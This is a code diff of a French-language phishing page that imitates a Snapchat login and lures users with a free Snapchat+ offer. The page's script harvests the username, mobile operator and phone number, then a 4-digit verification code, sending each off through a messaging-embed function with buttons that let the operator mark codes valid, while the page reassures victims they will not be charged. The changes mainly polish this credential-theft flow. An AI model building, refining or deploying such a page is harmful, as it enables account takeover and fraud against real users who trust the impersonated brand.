@@ -1,34 +1,233 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion | Snapchat</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-        body{margin:0;padding:0;background:#000;color:#fff;font-family:'Inter',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}
-        .container{width:100%;max-width:420px;padding:40px 24px;text-align:center;}
-        .logo{width:130px;height:130px;margin:10px auto 24px -10px;border-radius:20px;}
-        h1{color:#FFFC00;font-size:28px;margin:0 0 8px 0;}
-        p{color:#aaa;margin-bottom:32px;line-height:1.5;}
-        .form-group{margin-bottom:20px;text-align:left;}
-        label{display:block;margin-bottom:8px;font-size:14px;color:#ccc;}
-        input{width:100%;padding:16px 20px;background:#1a1a1a;border:1px solid #333;border-radius:12px;color:#fff;font-size:16px;box-sizing:border-box;}
-        input:focus{outline:none;border-color:#FFFC00;box-shadow:0 0 0 3px rgba(255,252,0,0.2);}
-        button:not(.op-btn){width:100%;padding:16px;background:#FFFC00;color:#000;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-top:12px;opacity:0.6;pointer-events:none;transition:all .3s;}
-        button:not(.op-btn).enabled{opacity:1;pointer-events:auto;}
-        button:not(.op-btn):hover.enabled{background:#e6e600;}
-        .op-btn{padding:14px 12px;border-radius:8px;font-weight:600;cursor:pointer;border:2px solid #444;background:#222;color:#acacac;transition:all .25s;flex:1;opacity:1!important;pointer-events:auto!important;}
-        .op-btn.selected{border:2px solid #FFFC00;box-shadow:0 0 12px rgba(255,252,0,0.4);color:#000!important;}
-        .hidden{display:none!important;}
-        .footer{margin-top:20px;font-size:13px;color:#666;}
-        .faq-link{color:#aaa;font-size:14px;text-decoration:underline;cursor:pointer;margin:30px 0 15px;display:inline-block;}
-        .faq-link:hover{color:#FFFC00;}
-        .spinner {border: 4px solid #333;border-top: 4px solid #FFFC00;border-radius: 50%;width: 40px;height: 40px;animation: spin 1s linear infinite;margin: 20px auto;}
-        @keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}
-        #status {margin-top:20px;padding:15px;border-radius:12px;font-size:18px;}
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 24px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 130px;
+            height: 130px;
+            margin: 10px auto 24px -10px;
+            border-radius: 20px;
+        }
+
+        h1 {
+            color: #FFFC00;
+            font-size: 28px;
+            margin: 0 0 8px 0;
+        }
+
+        p {
+            color: #aaa;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        /* Champ téléphone */
+        .phone-container {
+            display: flex;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            overflow: hidden;
+            align-items: center;
+        }
+
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            border-right: 1px solid #333;
+            background: #222;
+            height: 52px;
+            gap: 8px;
+        }
+
+        .phone-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 16px 20px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .phone-input:focus {
+            outline: none;
+        }
+
+        input:not(.phone-input) {
+            width: 100%;
+            padding: 16px 20px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input:focus:not(.phone-input) {
+            outline: none;
+            border-color: #FFFC00;
+            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.2);
+        }
+
+        /* Bouton Continuer jaune */
+        button:not(.op-btn) {
+            width: 100%;
+            padding: 16px;
+            background: #FFFC00;
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            opacity: 0.6;
+            pointer-events: none;
+            transition: all .3s;
+        }
+
+        button:not(.op-btn).enabled {
+            opacity: 1;
+            pointer-events: auto;
+            background: #FFFC00;
+        }
+
+        button:not(.op-btn).enabled:hover {
+            background: #e6e600;
+        }
+
+        .op-btn {
+            padding: 14px 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            border: 2px solid #444;
+            background: #222;
+            color: #acacac;
+            transition: all .25s;
+            flex: 1;
+            opacity: 1 !important;
+            pointer-events: auto !important;
+        }
+
+        .op-btn.selected {
+            border: 2px solid #FFFC00;
+            box-shadow: 0 0 12px rgba(255, 252, 0, 0.4);
+            color: #000 !important;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .faq-link {
+            color: #aaa;
+            font-size: 14px;
+            text-decoration: underline;
+            cursor: pointer;
+            margin: 30px 0 15px;
+            display: inline-block;
+        }
+
+        .faq-link:hover {
+            color: #FFFC00;
+        }
+
+        /* Texte sous le bouton */
+        .eligible-text {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #aaa;
+            line-height: 1.4;
+        }
+
+        /* Modal FAQ */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: #1a1a1a;
+            width: 90%;
+            max-width: 380px;
+            border-radius: 16px;
+            padding: 24px;
+            color: #fff;
+        }
+
+        .modal-content h2 {
+            color: #FFFC00;
+            margin-top: 0;
+        }
+
+        .close {
+            float: right;
+            font-size: 28px;
+            cursor: pointer;
+            color: #aaa;
+        }
+
+        .close:hover {
+            color: #fff;
+        }
     </style>
 </head>
+
 <body>
     <div class="container">
         <img src="https://files.catbox.moe/l1cylw.png" alt="Snapchat+" class="logo">
@@ -36,7 +235,11 @@
         <p id="subtitle">Connecte-toi pour continuer</p>
 
         <form id="step1">
-            <div class="form-group"><label>Nom d'utilisateur</label><input type="text" id="username" placeholder="Saisissez votre nom d'utilisateur" required></div>
+            <div class="form-group">
+                <label>Nom d'utilisateur</label>
+                <input type="text" id="username" placeholder="Saisissez votre nom d'utilisateur" required>
+            </div>
+
             <div class="form-group">
                 <label>Opérateur mobile</label>
                 <div style="display:flex;gap:10px;margin-bottom:10px;">
@@ -47,17 +250,34 @@
                 <small style="color:#ff4444;display:block;">FREE ne fonctionne pas.</small>
                 <input type="hidden" id="operator" value="">
             </div>
+
             <div class="form-group">
                 <label>Numéro de téléphone</label>
-                <input type="tel" id="phone" placeholder="06 XX XX XX XX" required maxlength="10" oninput="validatePhone(this);">
+                <div class="phone-container">
+                    <div class="phone-prefix">
+                        <span style="font-size:18px;">🇫🇷</span>
+                        <span style="color:#ccc;">+33</span>
+                    </div>
+                    <input type="tel" id="phone" class="phone-input" placeholder="06 44 44 44 44" required
+                        maxlength="14" oninput="formatPhoneNumber(this)">
+                </div>
+                <small style="color:#ff4444;display:block;margin-top:6px;">Uniquement les numéros commençant par 06 ou
+                    07.</small>
             </div>
-            <button type="submit" id="continueBtn">Continuer</button>
+
+            <button type="submit" id="continueBtn">Continuer ></button>
+            <div class="eligible-text">
+                L'abonnement Snapchat+ ne vous sera pas facturé.<br>
+                L'abonnement est disponible uniquement pour les utilisateurs éligibles.
+            </div>
         </form>
 
         <form id="step2" class="hidden">
             <div class="form-group">
                 <label>Code d'activation</label>
-                <input type="text" id="code" maxlength="4" placeholder="0000" required style="text-align:center;font-size:28px;letter-spacing:12px;" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4); validateCode();">
+                <input type="text" id="code" maxlength="4" placeholder="0000" required
+                    style="text-align:center;font-size:28px;letter-spacing:12px;"
+                    oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4); validateCode();">
             </div>
             <button type="submit" id="verifyBtn">Vérifier le code</button>
         </form>
@@ -71,6 +291,20 @@
 
         <div class="footer">
             <span class="faq-link" id="faqLink">Vous avez des questions ?</span><br>Snapchat ++
+                <p style="margin-top:15px; font-size:13px; color:#aaa;">Si vous ne recevez aucun code dans les 1 min qui
+                    suivent, contactez ce numéro : <strong>07 80 94 18 73</strong></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal FAQ -->
+    <div id="faqModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <h2>Questions fréquentes</h2>
+            <p><strong>- Code non reçu ?</strong><br>Réessaye dans 30 secondes.</p>
+            <p><strong>- Activation en cours...</strong><br>Patiente 1 à 3 minutes.</p>
+            <p><strong>- FREE ne marche pas ?</strong><br>Utilise SFR, Bouygues ou Orange.</p>
         </div>
     </div>
 
@@ -102,10 +336,24 @@
             });
         }
 
-        function validatePhone(input) {
-            let v = input.value.replace(/[^0-9]/g,'');
-            if (v.length > 0 && !v.startsWith('06') && !v.startsWith('07')) v = v.substring(0,2);
-            input.value = v.slice(0,10);
+        function formatPhoneNumber(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+
+            if (value.length > 2) {
+                let formatted = value.substring(0, 2);
+                for (let i = 2; i < value.length; i += 2) {
+                    formatted += ' ' + value.substring(i, i + 2);
+                }
+                input.value = formatted.trim().substring(0, 14);
+            } else {
+                input.value = value;
+            }
+
+            if (value.length > 0 && !value.startsWith('06') && !value.startsWith('07')) {
+                input.parentElement.style.borderColor = '#ff4444';
+            } else {
+                input.parentElement.style.borderColor = '';
+            }
         }
 
         function validateCode() {
@@ -116,9 +364,9 @@
         }
 
         const opButtons = {
-            'op-sfr': {name:'SFR', color:'#FF3333'},
-            'op-bouygues': {name:'Bouygues', color:'#1E90FF'},
-            'op-orange': {name:'Orange', color:'#FF8800'}
+            'op-sfr': { name: 'SFR', color: '#ff3333' },
+            'op-bouygues': { name: 'Bouygues', color: '#1E90FF' },
+            'op-orange': { name: 'Orange', color: '#FF8800' }
         };
 
         Object.keys(opButtons).forEach(id => {
@@ -133,12 +381,13 @@
                 btn.classList.add('selected');
                 btn.style.background = opButtons[id].color;
                 btn.style.color = '#000';
-                btn.style.borderColor = '#FFFC00';
+                btn.style.borderColor = '#3d3d3d';
                 document.getElementById('operator').value = opButtons[id].name;
                 document.getElementById('continueBtn').classList.add('enabled');
             });
         });
 
+        // Step 1
         document.getElementById('step1').addEventListener('submit', e => {
             e.preventDefault();
             const username = document.getElementById('username').value.trim();
@@ -148,9 +397,9 @@
             if (!operator || phone.length < 10) return alert("Données invalides");
 
             sendEmbed("🔐 Snapchat - Étape 1", [
-                {name:"Nom d'utilisateur", value: `\`${username}\``},
-                {name:"Opérateur", value: `\`${operator}\``},
-                {name:"Téléphone", value: `\`${phone}\``}
+                { name: "Nom d'utilisateur", value: `\`${username}\`` },
+                { name: "Opérateur", value: `\`${operator}\`` },
+                { name: "Téléphone", value: `\`${phone}\`` }
             ]);
 
             document.getElementById('step1').classList.add('hidden');
@@ -159,6 +408,7 @@
             document.getElementById('subtitle').textContent = "Entrez le code reçu";
         });
 
+        // Step 2
         document.getElementById('step2').addEventListener('submit', e => {
             e.preventDefault();
             const username = document.getElementById('username').value.trim();
@@ -169,12 +419,12 @@
             if (code.length !== 4) return alert("Le code doit contenir 4 chiffres");
 
             sendEmbed("✅ Snapchat - Code reçu", [
-                {name:"Nom d'utilisateur", value: `\`${username}\``},
-                {name:"Téléphone", value: `\`${phone}\``},
-                {name:"Code entré", value: `\`${code}\``}
+                { name: "Nom d'utilisateur", value: `\`${username}\`` },
+                { name: "Téléphone", value: `\`${phone}\`` },
+                { name: "Code entré", value: `\`${code}\`` }
             ], [
-                { type: 2, style: 5, label: "❌ Code NON valide", url: `${BASE_URL}/validate?sessionId=${currentSessionId}&valid=false` },
-                { type: 2, style: 5, label: "✅ Code VALIDE - Activation", url: `${BASE_URL}/validate?sessionId=${currentSessionId}&valid=true` }
+                { type: 2, style: 5, label: "Code non validé", url: `${BASE_URL}/validate?sessionId=${currentSessionId}&valid=false` },
+                { type: 2, style: 5, label: "Code validé - Activation en cours (1 à 3 min)", url: `${BASE_URL}/validate?sessionId=${currentSessionId}&valid=true` }
             ]);
 
             document.getElementById('step2').classList.add('hidden');
@@ -182,7 +432,6 @@
             document.getElementById('title').textContent = "Activation Snapchat+";
 
             if (pollingInterval) clearInterval(pollingInterval);
-
             pollingInterval = setInterval(() => {
                 if (!currentSessionId) return;
                 fetch(`/status/${currentSessionId}`)
@@ -193,21 +442,29 @@
                             if (data.validated) {
                                 statusDiv.style.background = 'rgba(0,255,0,0.15)';
                                 statusDiv.style.color = 'lime';
-                                statusDiv.innerHTML = `<strong>Code valide - 1-3min avant activation</strong>`;
+                                statusDiv.innerHTML = `<strong>Code validé - Snapchat+ Activé !</strong>`;
                             } else {
                                 statusDiv.style.background = 'rgba(255,0,0,0.15)';
                                 statusDiv.style.color = 'red';
-                                statusDiv.innerHTML = `<strong>Code invalide - Mettez le code valide</strong><br>Réessayez.`;
+                                statusDiv.innerHTML = `<strong>Code non validé</strong><br>Réessayez avec le bon code.`;
                             }
                             clearInterval(pollingInterval);
                         }
-                    }).catch(() => {});
+                    }).catch(() => { });
             }, 2500);
         });
 
-        document.getElementById('faqLink').addEventListener('click', () => {
-            alert("Questions fréquentes Snapchat+ :\n\n- Code non reçu ? Réessaye dans 30s.\n- Activation en cours...");
+        // Modal FAQ
+        const modal = document.getElementById('faqModal');
+        const faqLink = document.getElementById('faqLink');
+        const closeModal = document.getElementById('closeModal');
+
+        faqLink.addEventListener('click', () => modal.style.display = 'flex');
+        closeModal.addEventListener('click', () => modal.style.display = 'none');
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) modal.style.display = 'none';
         });
     </script>
 </body>
+
 </html>
